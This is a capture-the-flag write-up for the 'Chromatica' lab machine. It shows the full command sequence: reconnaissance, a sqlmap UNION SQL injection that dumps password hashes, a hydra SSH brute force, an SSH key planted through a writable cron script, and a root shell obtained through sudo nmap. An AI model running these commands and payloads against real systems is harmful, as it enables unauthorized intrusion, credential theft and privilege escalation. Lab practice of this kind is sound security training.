# Chromatica

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.102:22
Open 10.0.2.102:80
Open 10.0.2.102:5353
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.102
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBILuE7emxat5+R/en2quENVPigrmN45CWha4pupWvL0lT1/q0tFYaB0LoABPlVKs5/Dob23Exi5jYdV1PugUPlM=
|   256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIISi3povKIr32D6ShYBi21LE4gRFcGy/pMv/ccuSu1Xs
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Chromatica|Coming Soon..... 
|_http-server-header: Apache/2.4.52 (Ubuntu)
5353/tcp open  domain  syn-ack (generic dns response: REFUSED)
| dns-nsid: 
|_  bind.version: dnsmasq-2.86
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5353-TCP:V=7.95%I=7%D=11/4%Time=690A2A17%P=x86_64-alpine-linux-musl
SF:%r(DNS-SD-TCP,30,"\0\.\0\0\x80\x85\0\x01\0\0\0\0\0\0\t_services\x07_dns
SF:-sd\x04_udp\x05local\0\0\x0c\0\x01");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ feroxbuster -u http://10.0.2.102 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET        7l     1031w    78129c http://10.0.2.102/js/bootstrap.bundle.min.js
200      GET        6l   197380w  1725245c http://10.0.2.102/js/all.js
301      GET        9l       28w      309c http://10.0.2.102/assets => http://10.0.2.102/assets/
200      GET        8l       29w    28898c http://10.0.2.102/assets/favicon.ico
200      GET        7l       36w      321c http://10.0.2.102/js/scripts.js
200      GET       68l      301w     4047c http://10.0.2.102/
200      GET       68l      301w     4047c http://10.0.2.102/index.html
301      GET        9l       28w      313c http://10.0.2.102/javascript => http://10.0.2.102/javascript/
301      GET        9l       28w      305c http://10.0.2.102/js => http://10.0.2.102/js/
200      GET        2l        4w       36c http://10.0.2.102/robots.txt
```

```bash
└─$ curl http://10.0.2.102/robots.txt
user-agent: dev
Allow: /dev-portal/
```

```html
└─$ curl 'http://10.0.2.102/dev-portal/' -A dev
<!DOCTYPE html>
<html>
<head>
        <title>Chromatica</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="css/style.css">
</head>
<body>
        <div class="background-image"></div>
        <div class="container">
                <h1> Search</h1>
                <form action="search.php" method="get">
                        <label for="query">Chromatica</label>
                        <input type="text" id="query" name="city" placeholder="Type a city's name...">
                        <button type="submit">Go</button>
                </form>
        </div>
</body>
</html>
```

![writeup.png](/assets/pentest/hackmyvm/chromatica/writeup.png)

### SQLi

Seems to be vulnerable to SQLi

![writeup-1.png](/assets/pentest/hackmyvm/chromatica/writeup-1.png)

```bash
└─$ sqlmap -u 'http://10.0.2.102/dev-portal/search.php?city=x' -A 'dev' --batch --technique=U --current-db
---
Parameter: city (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=x' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qvkzq','nTMaAtlinVEaGnPtAviHsxkzwCXMPhXbtQtwOVEG'),'qkzkq'),NULL-- Aiab
---
[11:36:22] [INFO] fetching current database
current database: 'Chromatica'
```

```bash
└─$ sqlmap -u 'http://10.0.2.102/dev-portal/search.php?city=x' -A 'dev' --batch --technique=U -D Chromatica --tables
[11:37:16] [INFO] fetching tables for database: 'Chromatica'
Database: Chromatica
[2 tables]
+--------+
| cities |
| users  |
+--------+
```

```bash
└─$ sqlmap -u 'http://10.0.2.102/dev-portal/search.php?city=x' -A 'dev' --technique=U -D Chromatica -T users --dump
+----+----------------------------------+-----------+-----------------------------+
| id | password                         | username  | description                 |
+----+----------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3 | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7 | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5 | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9 | intern    | intern                      |
+----+----------------------------------+-----------+-----------------------------+
```

![writeup-2.png](/assets/pentest/hackmyvm/chromatica/writeup-2.png)

## SSH (dev)

```bash
└─$ nano users.txt
admin
dev
user
dev-selim
intern
taz
selim

└─$ nano pass.txt
adm!n
flaghere
keeptrying
intern00

└─$ hydra -L ./users.txt -P ./pass.txt 10.0.2.102 ssh -t 4 -I
[22][ssh] host: 10.0.2.102   login: dev   password: flaghere
```

::: tip Creds
`dev:flaghere`
:::

```bash
└─$ sshpass -p 'flaghere' ssh dev@10.0.2.102
Warning: Permanently added '10.0.2.102' (ED25519) to the list of known hosts.
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 10.0.2.102 closed.
```

![writeup-3.png](/assets/pentest/hackmyvm/chromatica/writeup-3.png)

```bash
dev@Chromatica:~$ cat bye.sh
#̣!/bin/bash

/usr/bin/more /home/dev/hello.txt
exit 0
```

### User.txt

```bash
dev@Chromatica:~$ cat user.txt
brightctf{ONE_OCKLOCK_8cfa57b4168}
```

## Privilege Escalation (analyst)

Password from database is not useful
```bash
dev@Chromatica:/var/www/html/dev-portal$ cat search.php
<?php
// Get search query from GET parameter
$city = $_GET['city'];

// Connect to database
$servername = "localhost";
$username = "dev";
$password = "Sup3rS3cur3";
$dbname = "Chromatica";
```

There are 3 normal users
```bash
dev@Chromatica:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
dev:x:1001:1001::/home/dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
think:x:1003:1003::/home/think:/bin/sh
```

There's a cronjob for analyst
```bash
dev@Chromatica:~$ cat /etc/crontab | grep -vE '^#|^$'
SHELL=/bin/sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
```

We can write to file
```bash
dev@Chromatica:/opt/scripts$ ls -alh
total 12K
drwxrwxrwx 2 root    root    4.0K Apr 18  2024 .
drwxr-xr-x 6 root    root    4.0K Apr 24  2024 ..
-rwxrwxrw- 1 analyst analyst   30 Apr 24  2024 end_of_day.s
```

Add SSH key 
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' > ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXPruh3hwMro5xGZcAllW4cKFaISWvZ3xWQzELJ8Nag woyag@kraken' > ~/.ssh/authorized_keys
```

```bash
dev@Chromatica:/opt/scripts$ echo 'mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXPruh3hwMro5xGZcAllW4cKFaISWvZ3xWQzELJ8Nag woyag@kraken' > ~/.ssh/authorized_keys' >> end_of_day.sh
```

```bash
└─$ ssh -i id_rsa analyst@10.0.2.102
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

## Privilege Escalation (root)

```bash
analyst@Chromatica:~$ sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
```

- [https://gtfobins.github.io/gtfobins/nmap/#sudo](https://gtfobins.github.io/gtfobins/nmap/#sudo)

```bash
analyst@Chromatica:~$ TF=$(mktemp)
analyst@Chromatica:~$ echo 'os.execute("/bin/bash -p")' > $TF
analyst@Chromatica:~$ sudo nmap --script=$TF
root@Chromatica:/home/analyst# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
analyst@Chromatica:~$ cat /root/root.txt
brightctf{DIR_EN_GREY_59ce1d6c207}
```

